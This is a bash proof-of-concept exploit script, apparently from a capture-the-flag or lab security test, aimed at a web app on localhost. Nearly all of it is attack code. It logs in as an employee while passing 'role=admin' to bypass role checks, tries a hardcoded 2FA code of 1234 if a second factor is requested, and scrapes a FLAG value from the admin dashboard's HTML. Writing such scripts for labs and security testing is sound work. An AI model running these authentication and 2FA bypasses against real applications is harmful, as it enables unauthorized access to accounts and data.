#!/bin/bash

# POC: Sensitive Data Exposure - Flag in HTML Attributes
# Target: http://localhost:5003/admin/dashboard
# Vulnerability: Flag stored in plain-text HTML attribute (requires auth bypass)

TARGET="http://localhost:5003"
LOGIN_URL="${TARGET}/login"
DASHBOARD_URL="${TARGET}/admin/dashboard"
TWO_FA_URL="${TARGET}/admin/2fa"

echo "[*] Sensitive Data Exposure POC - Flag in HTML Attributes"
echo "[*] This POC demonstrates flag exposure after authentication bypass"
echo ""

# Step 1: Create a session and authenticate using RBAC bypass
echo "[+] Step 1: Authenticating via RBAC bypass (employee with admin role)"
echo "[*] Performing login with role=admin parameter..."

# First login with employee credentials but admin role parameter
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
    -X POST "$LOGIN_URL" \
    -d "username=emp1&password=password1&role=admin" \
    -L 2>/dev/null)

echo "[*] Login response received"

# Step 2: Check if we got admin access without 2FA (due to missing auth state validation)
echo "[+] Step 2: Attempting to access dashboard directly..."
DASHBOARD_RESPONSE=$(curl -s -b /tmp/cookies.txt "$DASHBOARD_URL" 2>/dev/null)

# Try to extract flag from dashboard
FLAG=$(echo "$DASHBOARD_RESPONSE" | grep -oP 'flag="\K[^"]*' | head -1)

if [ -n "$FLAG" ]; then
    echo "[✓] SUCCESS: Flag exposed in HTML attribute!"
    echo "[!] Extracted Flag: $FLAG"
    echo ""
    
    # Show the vulnerable HTML element
    echo "[+] Vulnerable HTML element:"
    echo "$DASHBOARD_RESPONSE" | grep -o '<a[^>]*flag="[^"]*"[^>]*>[^<]*</a>' | head -1
    echo ""
    
    # Verify flag format
    if [[ $FLAG =~ ^FLAG\{ ]]; then
        echo "[✓] Valid CTF flag format detected"
    fi
    
    echo "[✓] POC SUCCESSFUL: Sensitive flag data exposed and extracted"
    exit 0
else
    # Try alternative extraction methods
    echo "[-] Direct flag extraction failed, trying alternative methods..."
    
    # Check if 2FA is required
    if echo "$DASHBOARD_RESPONSE" | grep -q "2fa"; then
        echo "[*] 2FA endpoint detected, attempting bypass with hardcoded code..."
        
        # Bypass 2FA with hardcoded code=1234
        TWO_FA_RESPONSE=$(curl -s -b /tmp/cookies.txt \
            -X POST "$TWO_FA_URL" \
            -d "code=1234" \
            2>/dev/null)
        
        echo "[*] 2FA bypass attempt with code=1234"
        
        # Now try accessing dashboard again
        DASHBOARD_RESPONSE=$(curl -s -b /tmp/cookies.txt "$DASHBOARD_URL" 2>/dev/null)
        FLAG=$(echo "$DASHBOARD_RESPONSE" | grep -oP 'flag="\K[^"]*' | head -1)
        
        if [ -n "$FLAG" ]; then
            echo "[✓] SUCCESS: Flag exposed after 2FA bypass!"
            echo "[!] Extracted Flag: $FLAG"
            echo ""
            
            # Show the vulnerable HTML element
            echo "[+] Vulnerable HTML element:"
            echo "$DASHBOARD_RESPONSE" | grep -o '<a[^>]*flag="[^"]*"[^>]*>[^<]*</a>' | head -1
            echo ""
            
            echo "[✓] POC SUCCESSFUL: Flag extracted after auth bypass"
            exit 0
        fi
    fi
    
    # Last resort - check if response contains any flag data
    if echo "$DASHBOARD_RESPONSE" | grep -qi "FLAG{"; then
        echo "[✓] Flag data found in response (different format)"
        echo "$DASHBOARD_RESPONSE" | grep -o "FLAG{[^}]*}"
        exit 0
    fi
    
    echo "[-] Unable to extract flag from dashboard"
    echo "[*] Response length: $(echo "$DASHBOARD_RESPONSE" | wc -c) bytes"
    echo "[*] Response preview (first 500 chars):"
    echo "$DASHBOARD_RESPONSE" | head -c 500
    exit 1
fi